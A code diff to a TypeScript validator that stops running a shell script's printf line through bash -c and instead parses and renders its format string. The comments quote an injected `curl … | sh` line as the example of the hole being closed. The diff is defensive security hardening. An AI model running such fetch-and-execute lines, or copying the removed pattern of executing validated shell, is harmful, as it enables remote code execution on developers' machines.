@@ -588,53 +588,56 @@ async function checkLensList(): Promise<Failures> {
     const script = "review/build-prompts.sh";
     const shell = await Bun.file(script).text();
 
-    // Anchored end to end as one `printf` with a quoted format and the two arguments the line
-    // takes. `^\s*printf\s.*>>"…"$` matched whatever sat in between, so a line reading
-    // `printf x; curl https://example.invalid/x | sh >>"$BUILD/lens-list.txt"` matched too and
-    // was then executed verbatim by the `bash -c` below. That runs under lefthook on every
-    // commit, so a maintainer with a contributor's branch checked out ran it on their own
-    // machine, unprompted. Running the line rather than matching its format is still the
-    // point; this bounds what may be run.
+    // The format is read out and rendered here rather than run. An earlier version of this
+    // check pulled the line out with a loose pattern and handed it to `bash -c`, so a branch
+    // whose build-prompts.sh read `printf x; curl … | sh >>"$BUILD/lens-list.txt"` had that
+    // line executed on the machine of whoever checked the branch out, by a lefthook hook, on
+    // commit. Nothing about a validator needs to run the shell it is validating: what the two
+    // sides have to agree on is the format string, and the format string can be read.
     const named = LENS_LIST_FILE.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-    const writes = new RegExp(String.raw`^\s*printf (?:-- )?'[^']*' "\$NAMESPACE" "\$lens" >>"\$BUILD/${named}"$`, "m");
-    const line = shell.match(writes)?.[0];
+    const writes = new RegExp(
+        String.raw`^\s*printf (?:-- )?'([^']*)' "\$NAMESPACE" "\$lens" >>"\$BUILD/${named}"$`,
+        "m",
+    );
+    const format = shell.match(writes)?.[1];
 
-    if (!line) {
+    if (format === undefined) {
         fail(
             list,
             script,
-            `has no line appending to ${LENS_LIST_FILE} in the shape this check runs:` +
+            `has no line appending to ${LENS_LIST_FILE} in the shape this check reads:` +
                 ` one printf with a quoted format, "$NAMESPACE" and "$lens"`,
         );
         return list;
     }
 
-    const dir = mkdtempSync(join(tmpdir(), "codeferret-lens-list-"));
+    // printf, for the two conversions this format is allowed to use. A format reaching for
+    // anything else is refused rather than guessed at, because a check that renders a
+    // format differently from the shell proves nothing about the shell.
+    const directives = format.match(/%./g) ?? [];
 
-    try {
-        const run = Bun.spawnSync(["bash", "-c", `set -eu\n${line}`], {
-            env: { ...process.env, NAMESPACE: "codeferret", lens: "example-lens", BUILD: dir },
-        });
+    if (directives.length !== 2 || directives.some((d) => d !== "%s")) {
+        fail(list, script, `its ${LENS_LIST_FILE} format uses ${directives.join(" ")}, and this check renders %s only`);
+        return list;
+    }
 
-        if (run.exitCode !== 0) {
-            fail(list, script, `its ${LENS_LIST_FILE} line does not run: ${run.stderr.toString().trim()}`);
-            return list;
-        }
+    const rendered = format
+        .replace(/%s/, "codeferret")
+        .replace(/%s/, "example-lens")
+        .replace(/\\n/g, "\n")
+        .replace(/\\t/g, "\t")
+        .replace(/\\\\/g, "\\");
 
-        const written = await Bun.file(join(dir, LENS_LIST_FILE)).text();
-        const read = dispatchedFrom(written);
+    const read = dispatchedFrom(rendered);
 
-        if (read.length !== 1 || read[0] !== "codeferret:example-lens") {
-            fail(
-                list,
-                "review/run-files.ts",
-                `LENS_LIST_LINE reads ${JSON.stringify(read)} out of ${JSON.stringify(written)},` +
-                    ` which is what ${script} writes`,
-            );
-            return list;
-        }
-    } finally {
-        rmSync(dir, { recursive: true, force: true });
+    if (read.length !== 1 || read[0] !== "codeferret:example-lens") {
+        fail(
+            list,
+            "review/run-files.ts",
+            `LENS_LIST_LINE reads ${JSON.stringify(read)} out of ${JSON.stringify(rendered)},` +
+                ` which is what ${script} writes`,
+        );
+        return list;
     }
 
     console.log(`OK lens-list: ${script} and review/run-files.ts agree on the line format`);
